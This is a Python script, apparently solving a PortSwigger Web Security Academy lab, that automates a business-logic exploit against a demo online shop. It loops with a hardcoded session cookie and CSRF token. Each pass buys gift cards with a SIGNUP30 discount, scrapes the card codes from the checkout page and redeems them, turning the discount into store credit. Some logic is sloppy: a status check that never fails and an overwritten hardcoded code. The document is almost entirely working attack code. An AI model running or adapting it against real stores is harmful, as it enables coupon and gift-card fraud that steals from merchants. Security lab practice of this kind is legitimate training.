import requests
from bs4 import BeautifulSoup

csrf = "kx1pbYe9XDemLKanNCAGozpBYtMwXFSQ"
session = "Na55TynsXAnp4f4DT8nuPUilsrYG3bF8"

for l in range (500):
    burp0_url = "https://0aea00ea04f13a47831a427300830033.web-security-academy.net:443/cart"
    burp0_cookies = {"session": f"{session}"}
    burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://0aea00ea04f13a47831a427300830033.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0aea00ea04f13a47831a427300830033.web-security-academy.net/product?productId=2", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9"}
    burp0_data = {"productId": "2", "redir": "PRODUCT", "quantity": "10"}
    response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    if response.status_code != 100:
        burp0_url = "https://0aea00ea04f13a47831a427300830033.web-security-academy.net:443/cart/coupon"
        burp0_cookies = {"session": f"{session}"}
        burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://0aea00ea04f13a47831a427300830033.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0aea00ea04f13a47831a427300830033.web-security-academy.net/cart", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9"}
        burp0_data = {"csrf": f"{csrf}", "coupon": "SIGNUP30"}
        response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        if response.status_code != 100:
            burp0_url = "https://0aea00ea04f13a47831a427300830033.web-security-academy.net:443/cart/checkout"
            burp0_cookies = {"session": f"{session}"}
            burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://0aea00ea04f13a47831a427300830033.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0aea00ea04f13a47831a427300830033.web-security-academy.net/cart", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9"}
            burp0_data = {"csrf": f"{csrf}"}
            response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
            if response.status_code != 100:
                soup = BeautifulSoup(response.text, 'html.parser')
                td_elements = soup.find_all('td')
                values = [td.get_text() for td in td_elements]
                valuesss = 0
                for value in values:
                    if len(value) == 10:
                        print(value)
                        valuesss += 1
                        burp0_data = {"csrf": f"{csrf}", "gift-card": "maw5R4FTYK"}
                        burp0_url = "https://0aea00ea04f13a47831a427300830033.web-security-academy.net:443/gift-card"
                        burp0_cookies = {"session": f"{session}"}
                        burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://0aea00ea04f13a47831a427300830033.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0aea00ea04f13a47831a427300830033.web-security-academy.net/my-account?id=wiener", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9"}
                        burp0_data = {"csrf": f"{csrf}", "gift-card": f"{value}"}
                        requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
                        if valuesss == 10:
                            print("Done")
                            break